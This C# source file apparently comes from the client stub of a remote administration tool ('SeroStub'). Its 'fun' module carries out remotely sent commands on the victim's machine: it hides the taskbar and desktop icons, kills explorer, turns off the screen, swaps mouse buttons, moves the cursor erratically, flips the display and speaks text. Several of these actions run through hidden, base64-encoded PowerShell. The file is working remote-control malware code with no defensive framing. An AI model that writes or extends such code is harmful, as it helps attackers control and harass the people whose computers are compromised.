using System.Runtime.InteropServices;
using System.Text.Json;

namespace SeroStub;

internal static class FunFeature
{
    // ── WinAPI imports ─────────────────────────────
    [DllImport("user32.dll")] private static extern nint FindWindow(string? cls, string? win);
    [DllImport("user32.dll")] private static extern nint FindWindowEx(nint parent, nint after, string? cls, string? win);
    [DllImport("user32.dll")] private static extern bool ShowWindow(nint hwnd, int nCmdShow);
    [DllImport("user32.dll")] private static extern nint SendMessage(nint hwnd, uint msg, nint wp, nint lp);
    [DllImport("user32.dll")] private static extern nint PostMessage(nint hwnd, uint msg, nint wp, nint lp);
    [DllImport("user32.dll")] private static extern bool SwapMouseButton(bool fSwap);
    [DllImport("user32.dll")] private static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] private static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")] private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, nint dwExtraInfo);
    [DllImport("user32.dll")] private static extern uint SystemParametersInfo(uint uiAction, uint uiParam, nint pvParam, uint fWinIni);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern uint SystemParametersInfoW(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
    [DllImport("winmm.dll", EntryPoint = "mciSendStringW", CharSet = CharSet.Unicode)] private static extern int mciSendString(string cmd, System.Text.StringBuilder? ret, int retLen, nint callback);

    private const uint WM_SYSCOMMAND    = 0x0112;
    private const nint SC_MONITORPOWER  = 0xF170;
    private const nint HWND_BROADCAST   = unchecked((nint)0xFFFF);
    private const int  SW_HIDE          = 0;
    private const int  SW_SHOW          = 5;
    private const byte VK_VOLUME_MUTE   = 0xAD;
    private const byte VK_VOLUME_DOWN   = 0xAE;
    private const byte VK_VOLUME_UP     = 0xAF;
    private const uint KEYEVENTF_KEYUP  = 0x0002;
    private const uint SPI_SETDESKWALLPAPER = 0x0014;

    internal static string Execute(string action, string param)
    {
        try
        {
            switch (action)
            {
                // ── CD-ROM ──────────────────────────────────────────────
                case "cd_open":
                    mciSendString("set cdaudio door open", null, 0, nint.Zero);
                    break;
                case "cd_close":
                    mciSendString("set cdaudio door closed", null, 0, nint.Zero);
                    break;

                // ── Taskbar ──────────────────────────────────────────────
                case "taskbar_show":
                    ToggleTaskbar(true);
                    break;
                case "taskbar_hide":
                    ToggleTaskbar(false);
                    break;

                // ── Explorer ────────────────────────────────────────────
                case "explorer_kill":
                    foreach (var p in System.Diagnostics.Process.GetProcessesByName("explorer"))
                    {
                        try { p.Kill(); p.Dispose(); } catch { }
                    }
                    break;
                case "explorer_start":
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("explorer.exe")
                    { UseShellExecute = true });
                    break;

                // ── Screen ──────────────────────────────────────────────
                case "screen_off":
                    PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
                    break;
                case "screen_on":
                    PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
                    break;

                // ── Clock ───────────────────────────────────────────────
                case "clock_hide":
                    ToggleTrayElement("TrayClockWClass", false);
                    break;
                case "clock_show":
                    ToggleTrayElement("TrayClockWClass", true);
                    break;

                // ── Tray Notify ─────────────────────────────────────────
                case "tray_hide":
                {
                    var tb = FindWindow("Shell_TrayWnd", null);
                    var tn = FindWindowEx(tb, nint.Zero, "TrayNotifyWnd", null);
                    if (tn != nint.Zero) ShowWindow(tn, SW_HIDE);
                    break;
                }
                case "tray_show":
                {
                    var tb = FindWindow("Shell_TrayWnd", null);
                    var tn = FindWindowEx(tb, nint.Zero, "TrayNotifyWnd", null);
                    if (tn != nint.Zero) ShowWindow(tn, SW_SHOW);
                    break;
                }

                // ── Desktop Icons ────────────────────────────────────────
                case "desktopicons_hide":
                    ToggleDesktopIcons(false);
                    break;
                case "desktopicons_show":
                    ToggleDesktopIcons(true);
                    break;

                // ── Mouse ────────────────────────────────────────────────
                case "mouse_swap":
                    SwapMouseButton(true);
                    break;
                case "mouse_normal":
                    SwapMouseButton(false);
                    break;

                // ── Volume ───────────────────────────────────────────────
                case "volume_up":
                    for (int i = 0; i < 5; i++) { keybd_event(VK_VOLUME_UP, 0, 0, 0); keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0); }
                    break;
                case "volume_down":
                    for (int i = 0; i < 5; i++) { keybd_event(VK_VOLUME_DOWN, 0, 0, 0); keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_KEYUP, 0); }
                    break;
                case "volume_mute":
                    keybd_event(VK_VOLUME_MUTE, 0, 0, 0);
                    keybd_event(VK_VOLUME_MUTE, 0, KEYEVENTF_KEYUP, 0);
                    break;

                // ── Text Speak ───────────────────────────────────────────
                case "speak":
                    if (!string.IsNullOrWhiteSpace(param))
                    {
                        // Env var avoids any PS string injection
                        var ps1 = "Add-Type -AssemblyName System.Speech;(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak($env:SERO_TTS)";
                        var enc1 = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps1));
                        var psi1 = new System.Diagnostics.ProcessStartInfo("powershell", $"-NoP -NonI -W H -EncodedCommand {enc1}")
                        { CreateNoWindow = true, UseShellExecute = false };
                        psi1.Environment["SERO_TTS"] = param;
                        using var p1 = System.Diagnostics.Process.Start(psi1);
                        p1?.WaitForExit(15000);
                    }
                    break;

                // ── Message Box ──────────────────────────────────────────
                case "msgbox":
                    if (!string.IsNullOrWhiteSpace(param))
                    {
                        // Env var avoids any PS string injection
                        var ps2 = "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show($env:SERO_MSG,'Notification')";
                        var enc2 = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps2));
                        var psi2 = new System.Diagnostics.ProcessStartInfo("powershell", $"-EncodedCommand {enc2}")
                        { CreateNoWindow = false, UseShellExecute = false };
                        psi2.Environment["SERO_MSG"] = param;
                        System.Diagnostics.Process.Start(psi2);
                    }
                    break;

                // ── Crazy Mouse ──────────────────────────────────────────
                case "crazy_mouse":
                    int.TryParse(param, out int seconds);
                    if (seconds < 1) seconds = 10;
                    if (seconds > 60) seconds = 60;
                    var rnd = new Random();
                    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
                    var end = DateTime.UtcNow.AddSeconds(seconds);
                    while (DateTime.UtcNow < end)
                    {
                        SetCursorPos(rnd.Next(0, w), rnd.Next(0, h));
                        Thread.Sleep(50);
                    }
                    break;

                // ── Flip Screen ───────────────────────────────────────────
                case "flip_screen":
                    int.TryParse(param, out int angle);
                    FlipScreen(angle);
                    break;

                // ── Open URL ─────────────────────────────────────────────
                case "open_url":
                    if (!string.IsNullOrWhiteSpace(param))
                        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(param) { UseShellExecute = true });
                    break;

                // ── Wallpaper ─────────────────────────────────────────────
                case "set_wallpaper":
                    if (!string.IsNullOrWhiteSpace(param) && File.Exists(param))
                        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, param, 3);
                    break;
            }
            return JsonSerializer.Serialize(new FunResultStub { Action = action, Result = "ok" }, SeroJson.Default.FunResultStub);
        }
        catch (Exception ex)
        {
            return JsonSerializer.Serialize(new FunResultStub { Action = action, Result = ex.Message }, SeroJson.Default.FunResultStub);
        }
    }

    // ── Helpers ────────────────────────────────────

    private static void ToggleTaskbar(bool show)
    {
        var taskbar = FindWindow("Shell_TrayWnd", null);
        if (taskbar != nint.Zero) ShowWindow(taskbar, show ? SW_SHOW : SW_HIDE);
        var start = FindWindow("Button", null);
        if (start != nint.Zero) ShowWindow(start, show ? SW_SHOW : SW_HIDE);
    }

    private static void ToggleTrayElement(string className, bool show)
    {
        var taskbar = FindWindow("Shell_TrayWnd", null);
        if (taskbar == nint.Zero) return;
        var tray = FindWindowEx(taskbar, nint.Zero, "TrayNotifyWnd", null);
        if (tray == nint.Zero) tray = taskbar;
        var el = FindWindowEx(tray, nint.Zero, className, null);
        if (el != nint.Zero) ShowWindow(el, show ? SW_SHOW : SW_HIDE);
    }

    private static void ToggleDesktopIcons(bool show)
    {
        var lv = FindDesktopListView();
        if (lv != nint.Zero) ShowWindow(lv, show ? SW_SHOW : SW_HIDE);
    }

    private static nint FindDesktopListView()
    {
        // Classic path: SHELLDLL_DefView directly under Progman
        var progman = FindWindow("Progman", "Program Manager");
        if (progman != nint.Zero)
        {
            var sh = FindWindowEx(progman, nint.Zero, "SHELLDLL_DefView", null);
            if (sh != nint.Zero)
            {
                var lv = FindWindowEx(sh, nint.Zero, "SysListView32", "FolderView");
                if (lv != nint.Zero) return lv;
            }
        }
        // Win10/11 path: SHELLDLL_DefView under a WorkerW
        nint workerW = nint.Zero;
        while ((workerW = FindWindowEx(nint.Zero, workerW, "WorkerW", null)) != nint.Zero)
        {
            var sh = FindWindowEx(workerW, nint.Zero, "SHELLDLL_DefView", null);
            if (sh != nint.Zero)
            {
                var lv = FindWindowEx(sh, nint.Zero, "SysListView32", "FolderView");
                if (lv != nint.Zero) return lv;
            }
        }
        return nint.Zero;
    }

    private static void FlipScreen(int angleDeg)
    {
        // Use DEVMODE orientation via powershell ChangeDisplaySettings
        int orientation = angleDeg switch
        {
            90  => 1,
            180 => 2,
            270 => 3,
            _   => 0
        };
        RunHidden("powershell",
            $"-NoP -NonI -W H -Command \"" +
            $"Add-Type -TypeDefinition @'\r\n" +
            $"using System.Runtime.InteropServices;\r\n" +
            $"[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]\r\n" +
            $"public struct DEVMODE{{" +
            $"[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;" +
            $"public ushort dmSpecVersion,dmDriverVersion,dmSize,dmDriverExtra;" +
            $"public uint dmFields;public int dmPositionX,dmPositionY,dmDisplayOrientation,dmDisplayFixedOutput;" +
            $"public short dmColor,dmDuplex,dmYResolution,dmTTOption,dmCollate;" +
            $"[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;" +
            $"public ushort dmLogPixels;public uint dmBitsPerPel,dmPelsWidth,dmPelsHeight,dmDisplayFlags,dmDisplayFrequency;" +
            $"public uint f1,f2,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,f13,f14,f15,f16,f17,f18,f19,f20,f21,f22,f23,f24,f25,f26;}}" +
            $"public class WinApi{{" +
            $"[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Unicode)]public static extern int EnumDisplaySettings(string d,int n,ref DEVMODE m);" +
            $"[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Unicode)]public static extern int ChangeDisplaySettings(ref DEVMODE m,int f);}}" +
            $"'@; $dm=New-Object DEVMODE; $dm.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dm);" +
            $"[WinApi]::EnumDisplaySettings([System.IntPtr]::Zero,-1,[ref]$dm)|Out-Null;" +
            $"$dm.dmDisplayOrientation={orientation};$dm.dmFields=0x80;" +
            $"[WinApi]::ChangeDisplaySettings([ref]$dm,0)|Out-Null\"");
    }

    private static void RunHidden(string exe, string args)
    {
        try
        {
            var p = new System.Diagnostics.ProcessStartInfo(exe, args)
            { CreateNoWindow = true, UseShellExecute = false };
            using var proc = System.Diagnostics.Process.Start(p);
            proc?.WaitForExit(10000);
        }
        catch { }
    }

    private static void RunDetached(string exe, string args)
    {
        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(exe, args)
            { UseShellExecute = false, CreateNoWindow = false });
        }
        catch { }
    }
}

internal class FunCmdDataStub    { public string Action { get; set; } = ""; public string Param { get; set; } = ""; }
internal class FunResultStub     { public string Action { get; set; } = ""; public string Result { get; set; } = ""; }
